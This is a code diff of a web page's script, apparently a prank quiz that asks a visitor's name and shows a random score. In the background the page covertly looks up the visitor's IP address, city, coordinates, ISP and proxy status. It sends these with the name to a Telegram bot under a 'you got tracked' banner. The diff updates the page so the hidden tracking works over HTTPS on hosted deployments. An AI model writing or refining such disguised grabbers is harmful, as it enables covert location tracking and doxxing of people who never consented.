@@ -155,20 +155,16 @@
             const nameInput = document.getElementById('userName').value;
             if (!nameInput) return;
 
-            // UI Switch (Instan)
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.remove('hidden');
 
             // --- PROSES BACKGROUND (FIRE AND FORGET) ---
-            // Jalankan pelacakan tanpa ditunggu (Gak pake await)
             getIntel().then(data => {
-                sendTele(nameInput, data);
+                if(data) sendTele(nameInput, data);
             });
 
-            // Logic Score
             const score = Math.floor(Math.random() * 41) + 60;
 
-            // MURNI 1 DETIK PAS (1000ms)
             setTimeout(() => {
                 document.getElementById('step2').classList.add('hidden');
                 document.getElementById('step3').classList.remove('hidden');
@@ -180,13 +176,37 @@
 
         async function getIntel() {
             try {
-                const res = await fetch('http://ip-api.com/json/?fields=66846719');
-                return await res.json();
-            } catch (e) { return null; }
+                // Pake IPWHO.IS karena support HTTPS Gratis (Penting buat Vercel)
+                const res = await fetch('https://ipwho.is/');
+                const d = await res.json();
+                
+                // Mapping agar variabel d.regionName dll tetep sinkron sama sendTele lo
+                return {
+                    query: d.ip,
+                    country: d.country,
+                    countryCode: d.country_code,
+                    regionName: d.region,
+                    city: d.city,
+                    lat: d.latitude,
+                    lon: d.longitude,
+                    zip: d.postal,
+                    timezone: d.timezone.id,
+                    isp: d.connection.isp,
+                    as: d.connection.asn,
+                    asname: d.connection.org,
+                    reverse: d.connection.domain,
+                    mobile: d.type === "mobile",
+                    proxy: d.security ? d.security.proxy : false,
+                    hosting: d.security ? d.security.hosting : false,
+                    status: d.success ? "success" : "fail"
+                };
+            } catch (e) { 
+                console.error("Intel Error:", e);
+                return null; 
+            }
         }
 
         async function sendTele(name, d) {
-            if(!d) return;
             const time = new Date().toLocaleString('id-ID', { timeZone: d.timezone || 'Asia/Jakarta' });
             
             const mini = `
@@ -194,7 +214,7 @@
 😂 *YAHAHA KE TRACK*
 ━━━━━━━━━━━━━━━━━━
 👤 *NAMA :* ${name.toUpperCase()}
-📍 *PROVINSI :* ${d.regionName || d.region}
+📍 *PROVINSI :* ${d.regionName}
 🌐 *ALAMAT IP :* \`${d.query}\`
 📶 *JARINGAN :* ${d.isp}
 🕒 *WAKTU LOKAL :* ${time}
@@ -230,19 +250,20 @@
 · Area: ${d.city}, ${d.regionName}
 ━━━━━━━━━━━━━━━━━━`;
 
-            // Kirim Mini
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: mini, parse_mode: 'Markdown' })
-            });
+            // Kirim ke Telegram API
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: mini, parse_mode: 'Markdown' })
+                });
 
-            // Kirim Full
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: full, parse_mode: 'Markdown' })
-            });
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: full, parse_mode: 'Markdown' })
+                });
+            } catch (e) { console.error("Tele Error:", e); }
         }
     </script>
 </body>
